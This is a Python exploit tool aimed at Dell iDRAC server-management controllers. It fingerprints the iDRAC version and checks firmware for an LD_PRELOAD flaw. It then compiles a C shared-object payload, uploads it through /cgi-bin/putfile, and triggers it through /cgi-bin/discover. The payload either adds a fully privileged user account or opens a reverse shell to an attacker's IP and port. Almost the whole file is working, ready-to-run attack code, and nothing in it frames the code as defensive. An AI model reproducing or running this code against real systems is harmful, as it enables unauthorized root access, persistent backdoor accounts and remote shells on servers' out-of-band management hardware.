import httpx
import warnings
import json
import os
import re
import struct
import ssl
import uuid
import asyncio
import shutil
from typing import Dict, Optional, Union
import socket
import random
import string
import secrets

# Disable SSL warnings for httpx
warnings.filterwarnings('ignore')

# SSL context configuration
ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE
ssl_context.set_ciphers('ALL:@SECLEVEL=0')
ssl_context.minimum_version = ssl.TLSVersion.TLSv1

class iDRAC:
    def __init__(self, ip: str, port: int = 443):
        self.ip = ip
        self.port = port
        self.base_url = f"https://{ip}:{port}"
        self.payloadScripts = "./payloads/"
        self.client = None  # Initialize as None
        self.payload_types = {
            "adduser": {
                "filename": "adduser.c",
                "filenameEnterprise": "adduser_enterprise.c",
                "variables": ["{username}", "{password}", "{privilege}"]
            },
            "reverseshell": {
                "filename": "reverseshell.c",
                "variables": ["{ip}", "{port}"]
            }
        }
    
    async def __aenter__(self):
        """Async context manager entry"""
        await self._ensure_client()
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit"""
        if self.client:
            await self.client.aclose()
    
    async def _ensure_client(self):
        """Ensure httpx client is initialized"""
        if not self.client:
            self.client = httpx.AsyncClient(
                verify=ssl_context,
                timeout=30.0,
            )

    async def _fetchURL(self, endpoint: str, data: Union[bytes, Dict] = None):
        await self._ensure_client()
        
        if data:
            return await self.client.post(url=f"{self.base_url}{endpoint}", data=data)
        else:
            return await self.client.get(url=f"{self.base_url}{endpoint}")
    
    async def getInfo(self):
        result = {
            "ip": self.ip,
            "port": self.port,
            "hostname": None,
            "idracModel": None,
            "license": None,
            "fwVersion": None,
            "systemModel": None,
            "error": None,
            "success": True
        }

        rLogin = await self._fetchURL("/login.html")
        if rLogin and rLogin.status_code == 200:
            if 'idrac6' in rLogin.text.lower() and 'idrac7' not in rLogin.text.lower():
                result['idracModel'] = 'iDRAC6'
                for line in rLogin.text.split('\n'):
                    if 'var tmphostname' in line.lower():
                        result['hostname'] = line.split('"')[1].strip()
                    elif 'integrated dell remote access controller 6' in line.lower():
                        result['license'] = line.split('- ')[1].split('<')[0]
                return result
        elif rLogin is None:
            result['success'] = False
            result['error'] = 'Timeout connecting to iDRAC'
            return result

        rDataPServerGen = await self._fetchURL("/data?get=prodServerGen")
        if rDataPServerGen and rDataPServerGen.status_code == 200:
            if '12g' in rDataPServerGen.text.lower():
                result['idracModel'] = 'iDRAC7'
            else:
                result['idracModel'] = 'iDRAC8'

            rDataClassName = await self._fetchURL("/data?get=prodClassName")
            if rDataClassName and rDataClassName.status_code == 200:
                try:
                    result['license'] = rDataClassName.text.split('<prodClassName>')[1].split('</prodClassName>')[0]
                except:
                    pass

            rSession = await self._fetchURL("/session?aimGetProp=hostname,gui_str_title_bar,OEMHostName,fwVersion,sysDesc")
            if rSession and rSession.status_code == 200:
                try:
                    data = json.loads(rSession.text)['aimGetProp']
                    result['hostname'] = data.get('hostname', 'Unknown')
                    result['fwVersion'] = data.get('fwVersion', 'Unknown')
                    result['systemModel'] = data.get('sysDesc', 'Unknown')
                except:
                    pass
            return result
        elif rDataPServerGen is None:
            result['success'] = False
            result['error'] = 'Timeout connecting to iDRAC'
            return result

        rLocale = await self._fetchURL("/restgui/locale/strings/locale_str_en.json")
        if rLocale and rLocale.status_code == 200:
            try:
                data = json.loads(rLocale.text)
                if data.get('app_title') == 'iDRAC9':
                    result['idracModel'] = 'iDRAC9'
            except:
                pass
        elif rLocale is None:
            result['success'] = False
            result['error'] = 'Timeout connecting to iDRAC'
            return result

        return result
    
    async def checkIfVulnerable(self):
        result = {
            "vulnerable": False,
            "error": None,
            "success": True
        }

        fwVulnerable = False
        ldDebugVulnerable = False

        # Firmware check
        try:
            rSession = await self._fetchURL("/session?aimGetProp=fwVersion")
            if rSession and rSession.status_code == 200:
                fwVersion = json.loads(rSession.text)['aimGetProp'].get('fwVersion', '')

                parts = fwVersion.split('.')
                if len(parts) >= 2:
                    major = int(parts[0])
                    minor = int(parts[1])
                    fwVulnerable = (major < 2) or (major == 2 and minor < 52)
        except Exception as e:
            result["success"] = False
            result["error"] = str(e)
            return result
        
        if fwVulnerable:
            try:
                rLDDebug = await self._fetchURL("/cgi-bin/login?LD_DEBUG=files")

                if rLDDebug and rLDDebug.text:
                    ldDebugVulnerable = r"calling init: /lib/" in rLDDebug.text
                    
            except Exception as e:
                result["success"] = False
                result["error"] = str(e)
                return result
        
        result["vulnerable"] = fwVulnerable and ldDebugVulnerable
        return result

    async def exploit(self, 
                     payload_type: str = "adduser", 
                     username: str = "root", 
                     password: str = "calvin", 
                     privilege: str = "0x000001ff",
                     reverse_ip: str = None,
                     reverse_port: int = None,
                     enableEnterprise: bool = False):
        """
        Execute exploit with selected payload
        
        Args:
            payload_type: Type of payload to use ("adduser" or "reverseshell")
            username: Username for adduser payload
            password: Password for adduser payload
            privilege: Privilege level for adduser payload
            reverse_ip: IP for reverse shell callback
            reverse_port: Port for reverse shell callback
            enableEnterprise: Enable enterprise features
        """
        
        result = {
            "payload_type": payload_type,
            "credentials": {
                "username": username,
                "password": password,
            },
            "reverse_shell": {
                "ip": reverse_ip,
                "port": reverse_port
            },
            "privilege": privilege,
            "success": True,
            "error": None
        }

        # Validate payload type
        if payload_type not in self.payload_types:
            result["success"] = False
            result["error"] = f"Invalid payload type. Available types: {list(self.payload_types.keys())}"
            return result

        # Validate reverse shell parameters if needed
        if payload_type == "reverseshell":
            if not reverse_ip or not reverse_port:
                result["success"] = False
                result["error"] = "Reverse shell requires both reverse_ip and reverse_port parameters"
                return result
            try:
                socket.inet_aton(reverse_ip)  # Validate IP address
            except socket.error:
                result["success"] = False
                result["error"] = "Invalid IP address format"
                return result
            if not 1 <= reverse_port <= 65535:
                result["success"] = False
                result["error"] = "Port must be between 1 and 65535"
                return result

        workFolder = f"work_{str(uuid.uuid4())[:8]}"
        os.makedirs(workFolder, exist_ok=True)

        try:
            # Load and prepare the payload
            payload_info = self.payload_types[payload_type]
            if payload_type == "adduser" and enableEnterprise == True:
                CPayloadFile = os.path.join(self.payloadScripts, payload_info["filenameEnterprise"])
            else:
                CPayloadFile = os.path.join(self.payloadScripts, payload_info["filename"])
            
            
            if not os.path.exists(CPayloadFile):
                result["success"] = False
                result["error"] = f"Payload file not found: {CPayloadFile}"
                return result

            with open(CPayloadFile, "r", encoding="utf-8") as f:
                CPayload = f.read()

            # Replace variables based on payload type
            if payload_type == "adduser":
                CPayload = CPayload.replace("{username}", username)
                CPayload = CPayload.replace("{password}", password)
                CPayload = CPayload.replace("{privilege}", privilege)
            elif payload_type == "reverseshell":
                CPayload = CPayload.replace("{ip}", reverse_ip)
                CPayload = CPayload.replace("{port}", str(reverse_port))

            # Save payload to work folder
            payload_c_path = os.path.join(workFolder, "payload.c")
            with open(payload_c_path, "w", encoding="utf-8") as f:
                f.write(CPayload)

            # Compile payload
            print(f"Compiling {payload_type} payload...")
            compileStatus = os.system(
                f'sh4-linux-gnu-gcc -shared -fPIC {payload_c_path} -o {os.path.join(workFolder, "payload.so")}'
            )
            if compileStatus != 0:
                result["error"] = "Compilation failed (SH4 cross-compiler required)"
                result["success"] = False
                print("Compilation failed")
                return result
            print("Compilation successful")
            
            # Read compiled payload
            print("Uploading payload...")
            with open(os.path.join(workFolder, "payload.so"), 'rb') as f:
                payload_so = f.read()

            # Prepare upload data
            FFLAGS = 1
            FAlias = b'RACPKSSHAUTHKEY1'
            payload = FAlias + (32 - len(FAlias))*b'\0'
            payload += struct.pack('<L', len(payload_so))
            payload += struct.pack('<L', FFLAGS)
            payload += payload_so

            # Upload payload
            rUpload = await self._fetchURL("/cgi-bin/putfile", data=payload)
            if rUpload and rUpload.status_code == 200:
                print("Payload uploaded successfully")
            else:
                print("Payload upload failed")
                result["error"] = "Error uploading payload, maybe a timeout issue."
                result["success"] = False
                return result
            
            # Trigger payload
            print("Triggering payload...")
            rTrigger = await self._fetchURL("/cgi-bin/discover?LD_PRELOAD=/tmp/sshpkauthupload.tmp")
            if rTrigger and rTrigger.status_code == 200:
                print("Payload triggered successfully")
                
                # Add success messages based on payload type
                if payload_type == "adduser":
                    print(f"✓ User added successfully")
                    print(f"  Username: {username}")
                    print(f"  Password: {password}")
                elif payload_type == "reverseshell":
                    print(f"✓ Reverse shell payload executed")
                    print(f"  Connecting to {reverse_ip}:{reverse_port}")
                    print("  Make sure you have a listener ready!")
                    
            else:
                print("Payload trigger failed")
                result["error"] = "Error triggering the payload, maybe a timeout issue."
                result["success"] = False
                return result
            
            return result
            
        except Exception as e:
            result["success"] = False
            result["error"] = str(e)
            print(f"Error during exploit: {e}")
            return result
            
        finally:
            # Clean up work folder
            if os.path.exists(workFolder):
                try:
                    shutil.rmtree(workFolder)
                    print(f"Cleaned up work folder: {workFolder}")
                except Exception as e:
                    print(f"Warning: Could not clean up work folder {workFolder}: {e}")
    
    async def genInventory(self):
        pass